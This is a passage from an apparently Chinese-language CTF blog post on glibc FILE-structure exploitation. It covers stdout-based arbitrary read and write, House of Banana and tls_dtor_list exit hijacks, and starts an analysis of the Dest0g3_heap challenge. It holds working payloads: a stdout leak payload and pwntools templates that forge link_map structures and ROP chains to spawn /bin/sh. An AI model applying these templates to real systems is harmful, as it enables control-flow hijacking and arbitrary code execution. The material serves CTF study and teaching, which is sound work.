class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) data;<br>  _IO_size_t to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  _IO_size_t count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123; <span class="hljs-comment">//如果是行缓冲模式...</span><br>      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class="hljs-comment">//判断输出缓冲区还有多少空间</span><br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>        &#123;<br>          <span class="hljs-type">const</span> <span class="hljs-type">char</span> *p;<br>          <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>            &#123;<br>              <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">//最后一个换行符\n为截断符，且需要刷新输出缓冲区</span><br>                &#123;<br>                  count = p - s + <span class="hljs-number">1</span>;<br>                  must_flush = <span class="hljs-number">1</span>; <span class="hljs-comment">//标志为真：需要刷新输出缓冲区</span><br>                  <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class="hljs-comment">//判断输出缓冲区还有多少空间（全缓冲模式）</span><br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">//如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区</span><br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>    count = to_do;<br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br>      s += count;<br>      to_do -= count;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//此处关键，见下文详细讨论</span><br>    &#123;<br>      _IO_size_t block_size, do_write;<br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="hljs-comment">//调用_IO_OVERFLOW</span><br>        <span class="hljs-keyword">return</span> to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br>      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>      do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (do_write)<br>        &#123;<br>          count = new_do_write (f, s, do_write);<br>          to_do -= count;<br>          <span class="hljs-keyword">if</span> (count &lt; do_write)<br>            <span class="hljs-keyword">return</span> n - to_do;<br>        &#125;<br>      <span class="hljs-keyword">if</span> (to_do)<br>        to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br>libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)<br></code></pre></td></tr></table></figure><h3 id="任意写"><a class="header-anchor" href="#任意写">¶</a><strong>任意写</strong></h3><p>可以看到，在行缓冲模式下，判断输出缓冲区还有多少空间，用的是<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>，而在全缓冲模式下，用的是<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>，若是还有空间剩余，则会将要输出的数据复制到输出缓冲区中（此时由<code>_IO_write_ptr</code>控制，向<code>_IO_write_ptr</code>拷贝<code>count</code>长度的数据），因此可通过这一点来实现任意地址写的功能。<br><strong>利用方式</strong>：以全缓冲模式为例，只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可。<br>这里需要注意的是，有宏定义<code>#define _IO_LINE_BUF 0x0200</code>，此处<code>flag &amp; _IO_LINE_BUF</code>为真，则表示<code>flag</code>中包含了<code>_IO_LINE_BUF</code>标识，即开启了行缓冲模式（可用<code>setvbuf(stdout,0,_IOLBF,1024)</code>开启），若要构造<code>flag</code>包含<code>_IO_LINE_BUF</code>标识，则<code>flag |= 0x200</code>即可。</p><h3 id="任意读"><a class="header-anchor" href="#任意读">¶</a><strong>任意读</strong></h3><p>先讨论<code>_IO_new_file_xsputn</code>源代码中<code>if (to_do + must_flush &gt; 0)</code>有哪些情况会执行该分支中的内容：<br><strong>(a)</strong> 首先要明确的是<code>to_do</code>一定是非负数，因此若<code>must_flush</code>为<code>1</code>的时候就会执行该分支中的内容，而再往上看，当需要输出的内容中有<code>\n</code>换行符的时候就会需要刷新输出缓冲区，即将<code>must_flush</code>设为<code>1</code>，故当输出内容中有<code>\n</code>的时候就会执行该分支的内容，如用<code>puts</code>函数输出就一定会执行。<br><strong>(b)</strong> 若<code>to_do</code>大于<code>0</code>，也会执行该分支中的内容，因此，当 输出缓冲区未建立 或者 输出缓冲区没有剩余空间 或者 输出缓冲区剩余的空间不够一次性将目标地址中的数据完全拷贝过来 的时候，也会执行该<code>if</code>分支中的内容。<br>而该<code>if</code>分支中主要调用了<code>_IO_OVERFLOW()</code>来刷新输出缓冲区，而在此过程中会调用<code>_IO_do_write()</code>输出我们想要的数据。</p><p>相关源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="hljs-type">int</span> ch)<br>&#123;<br>  <span class="hljs-comment">// 判断标志位是否包含_IO_NO_WRITES =&gt; _flags需要不包含_IO_NO_WRITES</span><br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)<br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位</span><br>  <span class="hljs-comment">// 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>    &#125;<br>  <span class="hljs-comment">// 调用_IO_do_write 输出 输出缓冲区</span><br>  <span class="hljs-comment">// 从_IO_write_base开始，输出(_IO_write_ptr - f-&gt;_IO_write_base)个字节的数据</span><br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) ch;<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> _IO_size_t <span class="hljs-title function_">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)</span><br>&#123;<br>  ...<br>  _IO_size_t count;<br>  <span class="hljs-comment">// 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<br>    fp-&gt;_offset = _IO_pos_BAD;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br>  <span class="hljs-comment">// 调用函数输出输出缓冲区</span><br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  ...<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>综上，为了做到<strong>任意读</strong>，满足如下条件，即可进行利用：<br>(1) 设置<code>_flag &amp;~ _IO_NO_WRITES</code>，即<code>_flag &amp;~ 0x8</code>；<br>(2) 设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>，即<code>_flag | 0x800</code>；<br>(3) 设置<code>_fileno</code>为<code>1</code>；<br>(4) 设置<code>_IO_write_base</code>指向想要泄露的地方，<code>_IO_write_ptr</code>指向泄露结束的地址；<br>(5) 设置<code>_IO_read_end</code>等于<code>_IO_write_base</code> 或 设置<code>_flag &amp; _IO_IS_APPENDING</code>即，<code>_flag | 0x1000</code>。<br>此外，有一个大前提：需要调用<code>_IO_OVERFLOW()</code>才行，因此需使得需要输出的内容中含有<code>\n</code>换行符 或 设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（输出缓冲区无剩余空间）等。<br>一般来说，经常利用<code>puts</code>函数加上述<code>stdout</code>任意读的方式泄露<code>libc</code>。<br><code>_flag</code>的构造需满足的条件:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_flags = <span class="hljs-number">0xfbad0000</span> <br>_flags &amp; = ~_IO_NO_WRITES <span class="hljs-comment">// _flags = 0xfbad0000</span><br>_flags | = _IO_CURRENTLY_PUTTING <span class="hljs-comment">// _flags = 0xfbad0800</span><br>_flags | = _IO_IS_APPENDING <span class="hljs-comment">// _flags = 0xfbad1800</span><br></code></pre></td></tr></table></figure><p>因此，例如在<code>libc-2.27</code>下，构造<code>payload = p64(0xfbad1800) + p64(0)*3 + b'\x58'</code>，泄露出的第一个地址即为<code>_IO_file_jumps</code>的地址。<br>此外，<code>_flags</code>也可再加一些其他无关紧要的部分，如设置为<code>0xfbad1887</code>，<code>0xfbad1880</code>，<code>0xfbad3887</code>等等。</p><h1>[番外篇]Exit 艺术鉴赏</h1><p>👴 不想开新的文章，何况 exit 和 IO 在某些场合联系比较紧。</p><p>下面所有利用手法的条件相对统一。</p><ol><li>能从主函数返回或进入 exit</li><li>一次 Largebin Attack 或任意写（libc 地址和 heap 地址要有）</li></ol><h2 id="Hosue-of-Banana"><a class="header-anchor" href="#Hosue-of-Banana">¶</a>Hosue of Banana</h2><p>这玩意单谈利用不难，结构体 👴 说实话看的似懂非懂，但是 👴 一调试就知道哪里可以打骚操作，只要劫持掉相关指针就好了。调试没写就是还在咕。</p><p>拿下面模板的话记得自己改改，不然咱wp撞了蛮尴尬 = =</p><h3 id="思路-v4"><a class="header-anchor" href="#思路-v4">¶</a>思路</h3><p>就算你现在没时间去调试，拿下面的模板，按这个步骤就能完成栈迁移：</p><ol><li>Largebin Attack 打 <code>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>。</li><li>下面的 link_4_addr 改成 Largebin(Chunk2) 的 <strong>chunk头</strong> 地址</li><li>利用 Chunk1 在 Chunk2 的 prev_data 位置写上 p64(link_4_addr + 0x20)</li><li>走 exit 触发 SROP 完成栈迁移，或者改掉下面标注的 RIP ，走自己的奇奇怪怪</li></ol><h3 id="SROP-栈迁移"><a class="header-anchor" href="#SROP-栈迁移">¶</a>SROP 栈迁移</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">rop_chain = flat(pop_rdi_ret,bin_sh,ret,system_addr)<br>link_4_addr = heap_base + <span class="hljs-number">0xcd0</span><br>fake_link_map = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(link_4_addr)<br>fake_link_map += p64(magic) + p64(ret)<span class="hljs-comment"># magic = setcontext+61</span><br>fake_link_map += p64(<span class="hljs-number">0</span>)<br>fake_link_map += rop_chain<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0xc8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x28</span> + <span class="hljs-number">0x18</span>) <span class="hljs-comment"># RSP</span><br>fake_link_map += p64(pop_rdi_ret)   <span class="hljs-comment"># RCX RIP</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x10</span> + <span class="hljs-number">0x110</span>)*<span class="hljs-number">0x3</span><br>fake_link_map += p64(<span class="hljs-number">0x10</span>)  <br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x31C</span> - <span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p8(<span class="hljs-number">0x8</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(link_4_addr + <span class="hljs-number">0x20</span>))<br>edit(<span class="hljs-number">2</span>,fake_link_map)<br></code></pre></td></tr></table></figure><h2 id="tls-dtor-list"><a class="header-anchor" href="#tls-dtor-list">¶</a>tls_dtor_list</h2><p>👴 也知道这玩意也不是 IO，但也扔这。</p><h3 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h3><ol><li>能从主函数返回或进入 exit</li><li>俩次 Largebin Attack 或任意写（libc 地址和 heap 地址要有），一次写 fskey，一次写 tls_dtor_list 指针</li></ol><h3 id="源码"><a class="header-anchor" href="#源码">¶</a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// glibc-2.35/stdlib/cxa_thread_atexit_impl.c</span><br><span class="hljs-comment">/* Call the destructors.  This is called either when a thread returns from the</span><br><span class="hljs-comment">   initial function or when the process exits via the exit function.  */</span><br><span class="hljs-type">void</span><br>__call_tls_dtors (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-keyword">while</span> (tls_dtor_list)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dtor_list</span> *<span class="hljs-title">cur</span> =</span> tls_dtor_list;<br>      dtor_func func = cur-&gt;func;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>      PTR_DEMANGLE (func);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      tls_dtor_list = tls_dtor_list-&gt;next;<br>      func (cur-&gt;obj);<br><br>      <span class="hljs-comment">/* Ensure that the MAP dereference happens before</span><br><span class="hljs-comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span><br><span class="hljs-comment"> potential DSO unload in _dl_close_worker, which happens when</span><br><span class="hljs-comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span><br>      atomic_fetch_add_release (&amp;cur-&gt;<span class="hljs-built_in">map</span>-&gt;l_tls_dtor_count, <span class="hljs-number">-1</span>);<br>      <span class="hljs-built_in">free</span> (cur);<br>    &#125;<br>&#125;<br>libc_hidden_def (__call_tls_dtors)<br></code></pre></td></tr></table></figure><h3 id="调试-v4"><a class="header-anchor" href="#调试-v4">¶</a>调试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; b __call_tls_dtors<br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x7ffff7dd1d60</span>: file ./stdlib/cxa_thread_atexit_impl.c, line <span class="hljs-number">149.</span><br></code></pre></td></tr></table></figure><p>一次打 fskey，通过 canary 或者 fsbase 寻址。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205843557.png" alt="image-20220721205843557"></p><p>一次打 tls_dtor_list。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205926990.png" alt="image-20220721205926990"></p><p>在流程中会从 Largebin 的 prev_data 位置拿 rax ，bk 位置拿 rdx。（size位置拿 rdi）</p><p>考虑：</p><ol><li>简单的通过前一堆块写 prev_data，Largebin 写 bk，利用 setcontext + 61 走 SROP</li><li>恢复 Largebin，申请出不同 size 的，写 system 和 <code>/bin/sh</code> 分别在俩位置 getshell</li></ol><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210027171.png" alt="image-20220721210027171"></p><p>完成控制流劫持。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210316505.png" alt="image-20220721210316505"></p><h3 id="SROP-栈迁移-v2"><a class="header-anchor" href="#SROP-栈迁移-v2">¶</a>SROP 栈迁移</h3><p>布局：</p><ol><li>Chunk1 是用来覆写 Chunk2 的 prev_data 部分</li><li>Chunk2 是用来 Largebin Attack 的 Largebin</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(rol(magic^(fskey),<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)))<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">1</span>+p64(heap_base+<span class="hljs-number">0xcd0</span>))<br></code></pre></td></tr></table></figure><h1>经典例题鉴赏</h1><h2 id="Dest0g3-heap"><a class="header-anchor" href="#Dest0g3-heap">¶</a>Dest0g3_heap</h2><p>这题 👴 肯定做麻烦了，但是 👴 打的很爽。</p><p>出自 BUUCTF 的 <a href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520迎新赛</a>。这题如果放到 2.34 且开沙箱，将是绝杀，👴 便愿称之为 <strong>IO 专项训练</strong>。可惜放不得。</p><p>但是 👴 这里还是自己分别假装打一下没有开了沙箱的情形和没有 <strong>hook</strong> 开了沙箱的情形，问就是 👴 不想自己整 demo 了。</p><h3 id="分析-v4"><a class="header-anchor" href="#分析-v4">¶</a>分析</h3><p>程序比较有意思，mmap 了一块空间，在其上我们可以任意 edit 和 free 。但是给我们的 add 是 calloc 一个堆块，对我们影响很大。 然后给的 show 也是 show 咱 calloc 的堆块，所以有点阴间。</p><h4 id="Init"><a class="header-anchor" href="#Init">¶</a>Init</h4><p><strong>setvbuf</strong> 👴 也见得多了，这 ✔️ 8️⃣ 玩意用在 stdin 和 stdout 特别合适，可以解决远端交互的问题。但是它会把指针放到 bss 段上，用在 <strong>stderr</strong> 会让 👴 🐑 <strong>Emma</strong> 的难度增加。这函数就是 mmap 了一块可读可写的区域，用作我们自己的堆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_121A</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    error(<span class="hljs-string">&quot;File urandom Open Failed&quot;</span>);<br>  read(fd, &amp;buf, <span class="hljs-number">5uLL</span>);<br>  Heap_arena = (__int64)mmap((<span class="hljs-type">void</span> *)(buf &amp; <span class="hljs-number">0xFFFFFFFFF000</span>LL), <span class="hljs-number">0x3000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Add"><a class="header-anchor" href="#Add">¶</a>Add</h4><p><strong>calloc</strong> 就算了，这玩意 add 的时候没有给 👴 输入数据的机会，👴 有点难受。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_14A9</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  buf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Edit"><a class="header-anchor" href="#Edit">¶</a>Edit</h4><p>只要在 mmap 分配的堆上，👴 想 edit 哪里，就 edit 哪里。主要这个 <strong>my_read</strong> 遇到 <strong>‘\x0a’</strong> 会截断，稍微注意一下就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1513</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0x1000</span> )<br>    error(<span class="hljs-string">&quot;Invalid size Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;offset: &quot;</span>, <span class="hljs-number">8uLL</span>);<br>  v2 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2 &gt;= <span class="hljs-number">0x2000</span> )<br>    error(<span class="hljs-string">&quot;Invalid offset Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  my_read(v2 + Heap_arena, v1);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Edit done\n&quot;</span>, <span class="hljs-number">0xA</span>uLL);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Dele"><a class="header-anchor" href="#Dele">¶</a>Dele</h4><p>只要在 mmap 分配的堆上，👴 想 free 哪里，就 free 哪里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">Free</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;idx: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &gt;= <span class="hljs-number">0x3000</span> )<br>    error(<span class="hljs-string">&quot;Invalid idx Receviced&quot;</span>);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)(Heap_arena + v1));<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Show"><a class="header-anchor" 